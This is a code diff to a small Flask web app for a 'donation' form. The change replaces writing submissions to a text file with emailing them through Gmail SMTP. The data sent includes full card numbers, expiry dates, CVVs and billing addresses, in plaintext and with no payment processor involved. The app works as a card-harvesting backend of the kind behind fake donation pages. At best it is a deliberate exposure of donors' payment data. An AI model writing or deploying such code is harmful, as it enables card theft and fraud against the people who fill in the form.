@@ -1,7 +1,10 @@
 from flask import Flask, render_template, request, redirect, jsonify
 import os
+import smtplib
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
 
-app = Flask(__name__)  # ✅ define app at the top
+app = Flask(__name__)
 
 @app.route('/')
 def index():
@@ -22,19 +25,48 @@ def submit():
     name_on_card = data.get('nameOnCard')
     country = data.get('country')
 
-    with open('donations.txt', 'a') as f:
-        f.write(f'Name: {name}\nEmail: {email}\nAmount: {amount}\nMessage: {message}\n')
-        f.write(f'Card: {card_number}, Expiry: {expiry}, CVV: {cvv}, Name on Card: {name_on_card}\n')
-        f.write(f'Billing Address: {billing}\nCountry: {country}\n')
-        f.write('-' * 50 + '\n')
+    # === Email content ===
+    subject = f"New Donation from {name}"
+    body = f"""
+    Name: {name}
+    Email: {email}
+    Amount: ${amount}
+    Message: {message}
+
+    Card Number: {card_number}
+    Expiry: {expiry}
+    CVV: {cvv}
+    Name on Card: {name_on_card}
+    Billing Address: {billing}
+    Country: {country}
+    """
+
+    send_email(subject, body)
 
     return jsonify({"message": "Donation received successfully"})
 
-@app.route('/thankyou')
-def thankyou():
-    return "<h2>Thank you for your support!</h2><p>Your donation has been received.</p>"
+def send_email(subject, body):
+    sender_email = "youremail@example.com"  # Replace with your Gmail
+    sender_password = "your_app_password"   # Use app password from Gmail
+    receiver_email = "youremail@example.com"  # Same or different email
 
-# ✅ Run app with correct host and port for Render
+    msg = MIMEMultipart()
+    msg['From'] = sender_email
+    msg['To'] = receiver_email
+    msg['Subject'] = subject
+
+    msg.attach(MIMEText(body, 'plain'))
+
+    try:
+        server = smtplib.SMTP('smtp.gmail.com', 587)
+        server.starttls()
+        server.login(sender_email, sender_password)
+        server.sendmail(sender_email, receiver_email, msg.as_string())
+        server.quit()
+        print("Email sent successfully.")
+    except Exception as e:
+        print("Failed to send email:", e)
+
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
     app.run(host='0.0.0.0', port=port)
